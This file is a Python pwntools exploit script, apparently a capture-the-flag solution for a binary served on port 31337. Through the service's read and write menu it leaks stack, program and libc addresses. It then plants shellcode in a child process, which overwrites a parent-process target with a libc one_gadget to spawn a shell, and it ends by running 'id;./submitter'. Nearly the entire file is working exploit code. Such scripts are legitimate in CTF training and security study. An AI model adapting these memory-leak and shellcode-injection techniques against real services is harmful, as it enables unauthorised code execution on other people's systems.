#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './challenge')

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

libc = ELF('./libc.so.6')

# if args.LOCAL_LIBC:
#     libc = exe.libc
# else:
#     library_path = libcdb.download_libraries('./libc.so.6')
#     if library_path:
#         exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
#         libc = exe.libc
#     else:
#         libc = ELF('./libc.so.6')

# def start(argv=[], *a, **kw):
#     '''Start the exploit against the target.'''
#     if args.GDB:
#         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
#     else:
#         return process([exe.path] + argv, *a, **kw)

gdbscript = '''
set follow-fork-mode parent
continue
'''.format(**locals())

# -- Exploit goes here --

# io = start()
io = remote(HOST, int(PORT))

def read(addr):
    io.sendlineafter(b'Choice: ', b'1')
    io.sendlineafter(b'Address: ', hex(addr).encode())
    io.recvuntil(b'Value: ')
    return int(io.recvline(), 16)

def write(addr, value):
    io.sendlineafter(b'Choice: ', b'2')
    io.sendlineafter(b'Value: ', hex(value).encode())
    io.sendlineafter(b'Address: ', hex(addr).encode())

stack_argv0 = read(0x1000)
log.info('stack_argv0: %#x', stack_argv0)

start_addr = read(stack_argv0 - 0x40)
log.info('start_addr: %#x', start_addr)
exe.address = start_addr - exe.entrypoint
log.info('exe.address: %#x', exe.address)

libc_start_main_ret = read(stack_argv0 - 0x110)
log.info('libc_start_main_ret: %#x', libc_start_main_ret)
libc.address = libc_start_main_ret - libc.libc_start_main_return
log.info('libc.address: %#x', libc.address)

# write jmp $+0x20 here once whole shellcode is ready
jump_instruction_addr = exe.address + 0x1484
jump = asm('jmp $+0x20')
child_shellcode_addr = jump_instruction_addr + 0x20

# write this to the parent
one_gadget = 0xebd38 # 0xebc81 0xebce2 0xebd38 0xebd3f
parent_target_addr = exe.address + 0x32A8
parent_target_value = libc.address + one_gadget
log.info('writing %#x to %#x', parent_target_value, parent_target_addr)
# parent_target_value &= 0xffffffff


child_shellcode = asm(f'''
{shellcraft.linux.syscalls.getppid()}
mov rdi, rax
mov rsi, {parent_target_addr}
mov rdx, {parent_target_value}
mov rax, {exe.sym.writev_helper}
call rax
''')

# write the shellcode to the child
for chunk in group(8, child_shellcode, 'fill', b'\x90'):
    write(child_shellcode_addr, u64(chunk))
    child_shellcode_addr += 8

# jump to the shellcode
write(jump_instruction_addr, u64(jump.ljust(8, b'\x00')))

sleep(1)
io.sendlineafter(b'Choice: ', b'3')

io.sendline(b'id;./submitter')

io.stream()

